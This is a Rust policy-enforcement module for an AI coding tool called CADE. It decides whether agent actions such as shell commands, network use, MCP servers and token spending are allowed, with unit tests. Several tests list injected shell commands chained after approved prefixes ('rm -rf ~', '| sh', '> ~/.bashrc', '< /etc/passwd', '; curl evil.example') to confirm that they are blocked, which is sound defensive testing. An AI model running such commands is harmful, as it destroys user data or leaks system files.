//! Organization policy for CADE.
//!
//! Admins keep policy as code in `<org>/.github` at `cade/policy.yml`.
//! Clients fetch it on sign-in (POLICY epic), cache it, and ask this crate
//! for a [`Decision`] before every governed action. A missing policy means
//! [`Policy::default`], which is permissive for personal use.

use serde::{Deserialize, Serialize};

pub const POLICY_PATH: &str = "cade/policy.yml";

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Policy {
    pub version: u32,
    #[serde(default)]
    pub models: Models,
    #[serde(default)]
    pub tools: Tools,
    #[serde(default)]
    pub outputs: Outputs,
    #[serde(default)]
    pub budgets: Budgets,
    /// Off unless an admin turns it on.
    #[serde(default = "off")]
    pub telemetry: Switch,
}

impl Default for Policy {
    fn default() -> Self {
        Policy {
            version: 0,
            models: Models::default(),
            tools: Tools::default(),
            outputs: Outputs::default(),
            budgets: Budgets::default(),
            telemetry: Switch::Off,
        }
    }
}

fn on() -> Switch {
    Switch::On
}
fn off() -> Switch {
    Switch::Off
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Switch {
    On,
    Off,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ToolMode {
    Allow,
    Ask,
    Deny,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Models {
    /// Empty means every model Copilot offers.
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default = "yes")]
    pub byok: bool,
}

fn yes() -> bool {
    true
}

impl Default for Models {
    fn default() -> Self {
        Models { allow: vec![], byok: true }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Tools {
    #[serde(default = "ask")]
    pub shell: ToolMode,
    /// Command prefixes that skip the prompt, e.g. `terraform plan`.
    #[serde(default)]
    pub preapproved: Vec<String>,
    #[serde(default = "on")]
    pub network: Switch,
    /// `None` means any MCP server; `Some(list)` is an allowlist.
    #[serde(default)]
    pub mcp: Option<Vec<String>>,
}

fn ask() -> ToolMode {
    ToolMode::Ask
}

impl Default for Tools {
    fn default() -> Self {
        Tools {
            shell: ToolMode::Ask,
            preapproved: vec![],
            network: Switch::On,
            mcp: None,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ShipVia {
    PullRequest,
    Push,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Requirement {
    Required,
    Optional,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Outputs {
    /// Empty means any design system. Entries look like `contoso-ds@4`.
    #[serde(default)]
    pub design_systems: Vec<String>,
    #[serde(default = "pr")]
    pub ship_via: ShipVia,
    #[serde(default = "optional")]
    pub iac_lint: Requirement,
    #[serde(default = "optional")]
    pub pii_classification: Requirement,
    #[serde(default = "yes")]
    pub strip_visio_macros: bool,
}

fn pr() -> ShipVia {
    ShipVia::PullRequest
}
fn optional() -> Requirement {
    Requirement::Optional
}

impl Default for Outputs {
    fn default() -> Self {
        Outputs {
            design_systems: vec![],
            ship_via: ShipVia::PullRequest,
            iac_lint: Requirement::Optional,
            pii_classification: Requirement::Optional,
            strip_visio_macros: true,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, Default)]
#[serde(deny_unknown_fields)]
pub struct Budgets {
    /// Monthly Copilot token budget per user. `None` means no CADE-level cap.
    #[serde(default)]
    pub monthly_tokens: Option<u64>,
}

/// A governed action CADE is about to take.
#[derive(Debug, Clone, PartialEq)]
pub enum Action<'a> {
    UseModel(&'a str),
    UseByok,
    RunShell(&'a str),
    AgentNetwork,
    UseMcpServer(&'a str),
    UseDesignSystem(&'a str),
    ShipByPush,
    SendTelemetry,
    /// Tokens already used this month plus the estimate for the next request.
    SpendTokens {
        used: u64,
        next: u64,
    },
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    /// Ask the user first (permission prompt).
    Ask,
    /// Blocked. `rule` is shown to the user, e.g. `tools.network = off`.
    Deny {
        rule: String,
    },
}

impl Policy {
    pub fn from_yaml(text: &str) -> Result<Self, PolicyError> {
        let p: Policy = serde_yaml_ng::from_str(text).map_err(|e| PolicyError::Parse(e.to_string()))?;
        Ok(p)
    }

    pub fn decide(&self, action: &Action<'_>) -> Decision {
        let deny = |rule: &str| Decision::Deny { rule: rule.to_string() };
        match action {
            Action::UseModel(m) => {
                if self.models.allow.is_empty() || self.models.allow.iter().any(|a| a.eq_ignore_ascii_case(m)) {
                    Decision::Allow
                } else {
                    deny("models.allow")
                }
            }
            Action::UseByok => {
                if self.models.byok {
                    Decision::Allow
                } else {
                    deny("models.byok = false")
                }
            }
            Action::RunShell(cmd) => {
                let cmd = cmd.trim();
                if !has_shell_operator(cmd) && self.tools.preapproved.iter().any(|p| cmd == p || cmd.starts_with(&format!("{p} "))) {
                    return Decision::Allow;
                }
                match self.tools.shell {
                    ToolMode::Allow => Decision::Allow,
                    ToolMode::Ask => Decision::Ask,
                    ToolMode::Deny => deny("tools.shell = deny"),
                }
            }
            Action::AgentNetwork => match self.tools.network {
                Switch::On => Decision::Allow,
                Switch::Off => deny("tools.network = off"),
            },
            Action::UseMcpServer(name) => match &self.tools.mcp {
                None => Decision::Allow,
                Some(list) if list.iter().any(|n| n == name) => Decision::Allow,
                Some(_) => deny("tools.mcp"),
            },
            Action::UseDesignSystem(ds) => {
                if self.outputs.design_systems.is_empty()
                    || self
                        .outputs
                        .design_systems
                        .iter()
                        .any(|d| d == ds || ds.starts_with(&format!("{d}.")))
                {
                    Decision::Allow
                } else {
                    deny("outputs.design_systems")
                }
            }
            Action::ShipByPush => match self.outputs.ship_via {
                ShipVia::Push => Decision::Allow,
                ShipVia::PullRequest => deny("outputs.ship_via = pull_request"),
            },
            Action::SendTelemetry => match self.telemetry {
                Switch::On => Decision::Allow,
                Switch::Off => deny("telemetry = off"),
            },
            Action::SpendTokens { used, next } => match self.budgets.monthly_tokens {
                Some(budget) if used.checked_add(*next).is_none_or(|total| total > budget) => deny("budgets.monthly_tokens"),
                _ => Decision::Allow,
            },
        }
    }
}

/// True when `cmd` could run more than one command or redirect I/O, so a
/// preapproved prefix can't vouch for the rest of it.
fn has_shell_operator(cmd: &str) -> bool {
    cmd.contains(['&', '|', ';', '`', '<', '>', '\n', '\r']) || cmd.contains("$(")
}

#[derive(Debug, thiserror::Error)]
pub enum PolicyError {
    #[error("policy.yml is not valid: {0}")]
    Parse(String),
}

#[cfg(test)]
mod tests {
    use super::*;

    const CONTOSO: &str = r#"
version: 12
models:
  allow: [sonnet-5.5, opus-5.5, auto]
  byok: false
tools:
  shell: ask
  preapproved: [cade-render, bicep, "terraform plan"]
  network: off
  mcp: [azure-docs]
outputs:
  design_systems: [contoso-ds@4]
  ship_via: pull_request
  iac_lint: required
  pii_classification: required
budgets:
  monthly_tokens: 10000000
telemetry: off
"#;

    #[test]
    fn parses_the_admin_screen_policy() {
        let p = Policy::from_yaml(CONTOSO).unwrap();
        assert_eq!(p.version, 12);
        assert!(!p.models.byok);
        assert_eq!(p.tools.network, Switch::Off);
        assert_eq!(p.outputs.iac_lint, Requirement::Required);
    }

    #[test]
    fn enforces_each_rule() {
        let p = Policy::from_yaml(CONTOSO).unwrap();
        assert_eq!(p.decide(&Action::UseModel("opus-5.5")), Decision::Allow);
        assert!(matches!(p.decide(&Action::UseModel("other")), Decision::Deny { .. }));
        assert!(matches!(p.decide(&Action::UseByok), Decision::Deny { .. }));
        assert_eq!(p.decide(&Action::RunShell("terraform plan -out x")), Decision::Allow);
        assert_eq!(p.decide(&Action::RunShell("npm install chart-lib@4")), Decision::Ask);
        assert_eq!(
            p.decide(&Action::AgentNetwork),
            Decision::Deny {
                rule: "tools.network = off".into()
            }
        );
        assert!(matches!(p.decide(&Action::UseMcpServer("random")), Decision::Deny { .. }));
        assert!(matches!(p.decide(&Action::ShipByPush), Decision::Deny { .. }));
        assert!(matches!(p.decide(&Action::SendTelemetry), Decision::Deny { .. }));
        assert_eq!(
            p.decide(&Action::SpendTokens {
                used: 9_900_000,
                next: 50_000
            }),
            Decision::Allow
        );
        assert!(matches!(
            p.decide(&Action::SpendTokens {
                used: 9_990_000,
                next: 50_000
            }),
            Decision::Deny { .. }
        ));
    }

    #[test]
    fn no_policy_is_permissive_except_telemetry() {
        let p = Policy::default();
        assert_eq!(p.decide(&Action::UseByok), Decision::Allow);
        assert_eq!(p.decide(&Action::AgentNetwork), Decision::Allow);
        assert!(matches!(p.decide(&Action::SendTelemetry), Decision::Deny { .. }));
    }

    #[test]
    fn rejects_unknown_keys() {
        assert!(Policy::from_yaml("version: 1\nmodles: {}\n").is_err());
    }

    fn policy(yaml: &str) -> Policy {
        Policy::from_yaml(yaml).unwrap()
    }

    fn deny(rule: &str) -> Decision {
        Decision::Deny { rule: rule.to_string() }
    }

    #[test]
    fn default_values_match_documented_defaults() {
        let p = Policy::default();
        assert_eq!(p.version, 0);
        assert_eq!(p.models, Models { allow: vec![], byok: true });
        assert_eq!(
            p.tools,
            Tools {
                shell: ToolMode::Ask,
                preapproved: vec![],
                network: Switch::On,
                mcp: None
            }
        );
        assert_eq!(
            p.outputs,
            Outputs {
                design_systems: vec![],
                ship_via: ShipVia::PullRequest,
                iac_lint: Requirement::Optional,
                pii_classification: Requirement::Optional,
                strip_visio_macros: true
            }
        );
        assert_eq!(p.budgets.monthly_tokens, None);
        assert_eq!(p.telemetry, Switch::Off);
    }

    #[test]
    fn from_yaml_version_only_returns_defaults_with_that_version() {
        assert_eq!(
            policy("version: 3\n"),
            Policy {
                version: 3,
                ..Policy::default()
            }
        );
    }

    #[test]
    fn from_yaml_partial_section_keeps_other_field_defaults() {
        let p = policy("version: 1\ntools: { network: off }\noutputs: { iac_lint: required }\n");
        assert_eq!(p.tools.network, Switch::Off);
        assert_eq!(p.tools.shell, ToolMode::Ask);
        assert_eq!(p.tools.mcp, None);
        assert_eq!(p.outputs.iac_lint, Requirement::Required);
        assert_eq!(p.outputs.ship_via, ShipVia::PullRequest);
        assert!(p.outputs.strip_visio_macros);
    }

    #[test]
    fn from_yaml_telemetry_on_parses_switch() {
        assert_eq!(policy("version: 1\ntelemetry: on\n").telemetry, Switch::On);
    }

    #[test]
    fn from_yaml_missing_version_returns_parse_error() {
        assert!(matches!(Policy::from_yaml("telemetry: off\n"), Err(PolicyError::Parse(_))));
    }

    #[test]
    fn from_yaml_unknown_nested_key_returns_parse_error() {
        let err = Policy::from_yaml("version: 1\ntools: { shel: deny }\n").unwrap_err();
        assert!(err.to_string().starts_with("policy.yml is not valid: "), "{err}");
        assert!(err.to_string().contains("shel"), "{err}");
    }

    #[test]
    fn from_yaml_invalid_enum_value_returns_parse_error() {
        assert!(matches!(
            Policy::from_yaml("version: 1\ntools: { shell: sometimes }\n"),
            Err(PolicyError::Parse(_))
        ));
        assert!(matches!(
            Policy::from_yaml("version: 1\noutputs: { ship_via: email }\n"),
            Err(PolicyError::Parse(_))
        ));
    }

    #[test]
    fn from_yaml_malformed_yaml_returns_parse_error() {
        assert!(matches!(Policy::from_yaml("version: [1\n"), Err(PolicyError::Parse(_))));
        assert!(matches!(Policy::from_yaml(""), Err(PolicyError::Parse(_))));
    }

    #[test]
    fn decide_use_model_empty_allowlist_allows_any_model() {
        assert_eq!(Policy::default().decide(&Action::UseModel("anything")), Decision::Allow);
    }

    #[test]
    fn decide_use_model_listed_model_in_other_case_allows() {
        let p = policy("version: 1\nmodels: { allow: [Opus-5.5] }\n");
        assert_eq!(p.decide(&Action::UseModel("opus-5.5")), Decision::Allow);
    }

    #[test]
    fn decide_use_model_unlisted_model_denies_with_models_allow_rule() {
        let p = policy("version: 1\nmodels: { allow: [opus-5.5] }\n");
        assert_eq!(p.decide(&Action::UseModel("opus-5")), deny("models.allow"));
    }

    #[test]
    fn decide_use_byok_disabled_denies_with_byok_rule() {
        let p = policy("version: 1\nmodels: { byok: false }\n");
        assert_eq!(p.decide(&Action::UseByok), deny("models.byok = false"));
    }

    #[test]
    fn decide_run_shell_each_mode_maps_to_its_decision() {
        let allow = policy("version: 1\ntools: { shell: allow }\n");
        let ask = policy("version: 1\ntools: { shell: ask }\n");
        let denied = policy("version: 1\ntools: { shell: deny }\n");
        assert_eq!(allow.decide(&Action::RunShell("ls")), Decision::Allow);
        assert_eq!(ask.decide(&Action::RunShell("ls")), Decision::Ask);
        assert_eq!(denied.decide(&Action::RunShell("ls")), deny("tools.shell = deny"));
    }

    #[test]
    fn decide_run_shell_preapproved_command_allows_even_when_shell_denied() {
        let p = policy("version: 1\ntools: { shell: deny, preapproved: [bicep] }\n");
        assert_eq!(p.decide(&Action::RunShell("bicep")), Decision::Allow);
        assert_eq!(p.decide(&Action::RunShell("bicep build main.bicep")), Decision::Allow);
    }

    #[test]
    fn decide_run_shell_surrounding_whitespace_is_trimmed_before_matching() {
        let p = policy("version: 1\ntools: { shell: deny, preapproved: [bicep] }\n");
        assert_eq!(p.decide(&Action::RunShell("  bicep build  ")), Decision::Allow);
    }

    #[test]
    fn decide_run_shell_prefix_without_word_boundary_falls_back_to_shell_mode() {
        let p = policy("version: 1\ntools: { shell: deny, preapproved: [bicep] }\n");
        assert_eq!(p.decide(&Action::RunShell("bicepx build")), deny("tools.shell = deny"));
        assert_eq!(p.decide(&Action::RunShell("sudo bicep")), deny("tools.shell = deny"));
    }

    #[test]
    fn decide_run_shell_operator_after_preapproved_prefix_falls_back_to_shell_mode() {
        let p = policy("version: 1\ntools: { shell: deny, preapproved: [\"terraform plan\"] }\n");
        for cmd in [
            "terraform plan && rm -rf ~",
            "terraform plan || rm -rf ~",
            "terraform plan; rm -rf ~",
            "terraform plan | sh",
            "terraform plan & rm -rf ~",
            "terraform plan `rm -rf ~`",
            "terraform plan $(rm -rf ~)",
            "terraform plan > ~/.bashrc",
            "terraform plan < /etc/passwd",
            "terraform plan\nrm -rf ~",
        ] {
            assert_eq!(p.decide(&Action::RunShell(cmd)), deny("tools.shell = deny"), "{cmd:?}");
        }
    }

    #[test]
    fn decide_run_shell_preapproved_command_with_plain_arguments_still_allows() {
        let p = policy("version: 1\ntools: { shell: deny, preapproved: [\"terraform plan\"] }\n");
        assert_eq!(p.decide(&Action::RunShell("terraform plan")), Decision::Allow);
        assert_eq!(p.decide(&Action::RunShell("terraform plan -out x")), Decision::Allow);
    }

    #[test]
    fn decide_run_shell_operator_in_ask_mode_asks_instead_of_allowing() {
        let p = policy("version: 1\ntools: { shell: ask, preapproved: [bicep] }\n");
        assert_eq!(p.decide(&Action::RunShell("bicep build; curl evil.example")), Decision::Ask);
    }

    #[test]
    fn decide_use_mcp_server_no_allowlist_allows_any_server() {
        assert_eq!(Policy::default().decide(&Action::UseMcpServer("random")), Decision::Allow);
    }

    #[test]
    fn decide_use_mcp_server_allowlist_allows_listed_and_denies_others() {
        let p = policy("version: 1\ntools: { mcp: [azure-docs] }\n");
        assert_eq!(p.decide(&Action::UseMcpServer("azure-docs")), Decision::Allow);
        assert_eq!(p.decide(&Action::UseMcpServer("Azure-Docs")), deny("tools.mcp"));
        assert_eq!(p.decide(&Action::UseMcpServer("random")), deny("tools.mcp"));
    }

    #[test]
    fn decide_use_mcp_server_empty_allowlist_denies_every_server() {
        let p = policy("version: 1\ntools: { mcp: [] }\n");
        assert_eq!(p.decide(&Action::UseMcpServer("azure-docs")), deny("tools.mcp"));
    }

    #[test]
    fn decide_use_design_system_empty_allowlist_allows_any_system() {
        assert_eq!(Policy::default().decide(&Action::UseDesignSystem("fabrikam-ds@1")), Decision::Allow);
    }

    #[test]
    fn decide_use_design_system_listed_major_allows_exact_and_minor_versions() {
        let p = policy("version: 1\noutputs: { design_systems: [contoso-ds@4] }\n");
        assert_eq!(p.decide(&Action::UseDesignSystem("contoso-ds@4")), Decision::Allow);
        assert_eq!(p.decide(&Action::UseDesignSystem("contoso-ds@4.2")), Decision::Allow);
    }

    #[test]
    fn decide_use_design_system_other_version_denies_with_design_systems_rule() {
        let p = policy("version: 1\noutputs: { design_systems: [contoso-ds@4] }\n");
        assert_eq!(p.decide(&Action::UseDesignSystem("contoso-ds@5")), deny("outputs.design_systems"));
        assert_eq!(p.decide(&Action::UseDesignSystem("contoso-ds@40")), deny("outputs.design_systems"));
    }

    #[test]
    fn decide_ship_by_push_each_ship_via_maps_to_its_decision() {
        let push = policy("version: 1\noutputs: { ship_via: push }\n");
        assert_eq!(push.decide(&Action::ShipByPush), Decision::Allow);
        assert_eq!(
            Policy::default().decide(&Action::ShipByPush),
            deny("outputs.ship_via = pull_request")
        );
    }

    #[test]
    fn decide_send_telemetry_each_switch_maps_to_its_decision() {
        assert_eq!(
            policy("version: 1\ntelemetry: on\n").decide(&Action::SendTelemetry),
            Decision::Allow
        );
        assert_eq!(Policy::default().decide(&Action::SendTelemetry), deny("telemetry = off"));
    }

    #[test]
    fn decide_spend_tokens_no_budget_allows_any_amount() {
        let a = Action::SpendTokens {
            used: u64::MAX / 2,
            next: u64::MAX / 2,
        };
        assert_eq!(Policy::default().decide(&a), Decision::Allow);
    }

    #[test]
    fn decide_spend_tokens_exactly_at_budget_allows_and_one_over_denies() {
        let p = policy("version: 1\nbudgets: { monthly_tokens: 1000 }\n");
        assert_eq!(p.decide(&Action::SpendTokens { used: 900, next: 100 }), Decision::Allow);
        assert_eq!(
            p.decide(&Action::SpendTokens { used: 900, next: 101 }),
            deny("budgets.monthly_tokens")
        );
    }

    #[test]
    fn decide_spend_tokens_maximum_budget_overflow_denies() {
        let p = Policy {
            budgets: Budgets {
                monthly_tokens: Some(u64::MAX),
            },
            ..Policy::default()
        };
        assert_eq!(
            p.decide(&Action::SpendTokens { used: u64::MAX, next: 1 }),
            deny("budgets.monthly_tokens")
        );
    }

    #[test]
    fn decide_spend_tokens_overflowing_sum_denies() {
        let p = policy("version: 1\nbudgets: { monthly_tokens: 1000 }\n");
        assert_eq!(
            p.decide(&Action::SpendTokens { used: u64::MAX, next: 1 }),
            deny("budgets.monthly_tokens")
        );
        assert_eq!(
            p.decide(&Action::SpendTokens {
                used: u64::MAX,
                next: u64::MAX
            }),
            deny("budgets.monthly_tokens")
        );
    }
}
